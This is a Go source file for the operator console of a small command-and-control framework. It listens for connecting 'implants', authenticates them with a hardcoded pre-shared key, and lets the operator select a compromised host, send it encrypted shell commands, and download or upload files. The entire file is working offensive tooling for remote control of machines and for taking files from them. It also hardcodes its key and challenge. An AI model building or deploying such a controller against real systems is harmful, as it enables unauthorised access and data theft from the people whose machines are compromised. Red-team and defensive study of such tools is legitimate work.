package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net"
	"strconv"
	"strings"
	"sync"

	"github.com/chzyer/readline"
	encryption "github.com/grines/minic2/common"
)

const PSK = "thisiscoolthisiscool1234"

type Client struct {
	conn     net.Conn
	id       int
	dir      string // Current directory of the client
	hostname string // Hostname of the client
	ip       string // IP address of the client
}

var (
	clients       = make(map[int]Client)
	clientsLock   = sync.Mutex{}
	clientID      = 0
	currentClient *Client
)

func main() {
	fmt.Println("Starting CLI listener...")

	ln, err := net.Listen("tcp", "127.0.0.1:8008")
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer ln.Close()

	go acceptLoop(ln)

	rl, err := readline.New("> ")
	if err != nil {
		panic(err)
	}
	defer rl.Close()

	for {
		command, err := rl.Readline()
		if err != nil { // io.EOF, readline.ErrInterrupt
			break
		}

		switch {
		case command == "":
			continue
		case strings.HasPrefix(command, "select "):
			handleSelectCommand(command)
			if currentClient != nil {
				requestCurrentDirectory(currentClient)
				updatePrompt(rl)
			}
		case command == "list":
			listClients()
		default:
			if currentClient == nil {
				fmt.Println("No implant selected. Use 'select <implant_id>' to choose a implant.")
				continue
			}
			if !handleClientCommand(currentClient, command, rl) { // Pass rl here
				continue
			}
			requestCurrentDirectory(currentClient)
			updatePrompt(rl)
		}
	}
}

func acceptLoop(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		// Send a challenge
		challenge := "the_challenge19347627"
		conn.Write([]byte(challenge + "\n"))

		// Read the response
		response, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println("Error reading response:", err)
			conn.Close()
			continue
		}

		// Validate the response
		expectedResponse := generateResponse2(challenge, PSK)
		if strings.TrimSpace(response) != expectedResponse {
			fmt.Println("Authentication failed")
			conn.Close()
			continue
		}

		// Extract the IP address
		addr := conn.RemoteAddr().(*net.TCPAddr)
		ip := addr.IP.String()

		// Try to resolve the hostname
		hostnames, err := net.LookupAddr(ip)
		hostname := ip // Default to IP if hostname resolution fails
		if err == nil && len(hostnames) > 0 {
			hostname = hostnames[0]
		}

		clientsLock.Lock()
		clientID++
		c := Client{conn: conn, id: clientID, hostname: hostname, ip: ip}
		clients[clientID] = c
		clientsLock.Unlock()

		fmt.Printf("New implant connected: %d, Hostname: %s, IP: %s\n", clientID, hostname, ip)
	}
}

func generateResponse2(challenge string, psk string) string {
	// Should be the same implementation as in payload.go
	hash := sha256.Sum256([]byte(challenge + psk))
	return fmt.Sprintf("%x", hash)
}

func handleSelectCommand(command string) {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		fmt.Println("Invalid select command. Use 'select <implant_id>'")
		return
	}

	id, err := strconv.Atoi(parts[1])
	if err != nil {
		fmt.Println("Invalid implant ID:", parts[1])
		return
	}

	clientsLock.Lock()
	client, ok := clients[id]
	clientsLock.Unlock()

	if !ok {
		fmt.Println("No implant with ID:", id)
		return
	}

	currentClient = &client
	fmt.Printf("Selected implant %d\n", id)
}

func updatePrompt(rl *readline.Instance) {
	if rl == nil {
		return // Safeguard against nil readline instance
	}

	if currentClient != nil {
		// Include the client ID in the prompt
		rl.SetPrompt(fmt.Sprintf("Implant %d - %s> ", currentClient.id, currentClient.dir))
	} else {
		rl.SetPrompt("> ") // Set to default prompt when no client is selected
	}
}

func handleClientCommand(client *Client, command string, rl *readline.Instance) bool {
	//Encrypt it
	encryptedCommand, err := encryption.Encrypt(command, PSK)
	if err != nil {
		fmt.Println("Error encrypting command:", err)
		return false
	}

	fmt.Println(encryptedCommand)

	// Send the command to the server
	_, err = client.conn.Write([]byte(encryptedCommand + "\n"))
	if err != nil {
		fmt.Println("Error sending command:", err)
		removeClient(client.id, rl)
		return false
	}

	// Read the response from the server
	response, err := bufio.NewReader(client.conn).ReadString('\n')
	if err != nil {
		fmt.Println("Error sending command:", err)
		removeClient(client.id, rl) // Pass rl here
		return false
	}

	// Decode the response
	decodedOutput, err := base64.StdEncoding.DecodeString(strings.TrimSpace(response))
	if err != nil {
		fmt.Println("Error decoding response:", err)
		return true
	}

	// In handleClientCommand, after receiving the response
	decryptedOutput, err := encryption.Decrypt(string(decodedOutput), PSK)
	if err != nil {
		fmt.Println("Error decrypting response:", err)
		return false
	}

	if strings.HasPrefix(command, "download ") {
		saveDownloadedFile(command, string(decryptedOutput))
		return true
	}
	if strings.HasPrefix(command, "upload ") {
		return handleFileUpload(client, command)
	}

	fmt.Println(string(decryptedOutput))
	return true
}

func requestCurrentDirectory(client *Client) {

	if client == nil {
		return // Do nothing if the client is nil
	}

	//Encrypt it
	encryptedCommand, err := encryption.Encrypt("pwd", PSK)
	if err != nil {
		fmt.Println("Error encrypting command:", err)
	}

	// Send the command to the server
	_, err = client.conn.Write([]byte(encryptedCommand + "\n"))
	if err != nil {
		fmt.Println("Error sending command:", err)
	}
	// Read the response (current directory) from the client
	dirResponse, err := bufio.NewReader(client.conn).ReadString('\n')
	if err != nil {
		fmt.Println("Error reading directory response:", err)
		return
	}

	// Decode the response
	decodedOutput, err := base64.StdEncoding.DecodeString(strings.TrimSpace(dirResponse))
	if err != nil {
		fmt.Println("Error decoding response:", err)
	}

	// In handleClientCommand, after receiving the response
	decryptedOutput, err := encryption.Decrypt(string(decodedOutput), PSK)
	if err != nil {
		fmt.Println("Error decrypting response:", err)
	}

	client.dir = decryptedOutput
}

func listClients() {
	clientsLock.Lock()
	defer clientsLock.Unlock()

	if len(clients) == 0 {
		fmt.Println("No implants connected.")
		return
	}

	fmt.Println("Connected implants:")
	for id, client := range clients {
		fmt.Printf(" - Implant ID: %d, Hostname: %s, IP: %s\n", id, client.hostname, client.ip)
	}
}

func removeClient(id int, rl *readline.Instance) {
	clientsLock.Lock()
	defer clientsLock.Unlock()

	delete(clients, id)
	fmt.Printf("Implant %d disconnected\n", id)

	if currentClient != nil && currentClient.id == id {
		currentClient = nil
		updatePrompt(rl) // Pass the readline instance
	}
}

func saveDownloadedFile(command, content string) {
	parts := strings.Fields(command)
	if len(parts) < 2 {
		fmt.Println("Invalid download command")
		return
	}

	fileName := parts[1] // Assuming the file name is the second part of the command
	err := ioutil.WriteFile(fileName, []byte(content), 0644)
	if err != nil {
		fmt.Println("Error saving file:", err)
		return
	}

	fmt.Printf("File %s downloaded successfully\n", fileName)
}

func handleFileUpload(client *Client, command string) bool {
	parts := strings.Fields(command)
	if len(parts) != 3 {
		fmt.Println("Usage: upload <localpath> <remotepath>")
		return false
	}

	localPath, remotePath := parts[1], parts[2]

	fileData, err := ioutil.ReadFile(localPath)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return false
	}

	encodedData := base64.StdEncoding.EncodeToString(fileData)
	uploadCommand := fmt.Sprintf("upload %s %s", remotePath, encodedData)

	_, err = client.conn.Write([]byte(uploadCommand + "\n"))
	if err != nil {
		fmt.Println("Error sending upload command:", err)
		return false
	}

	return true
}
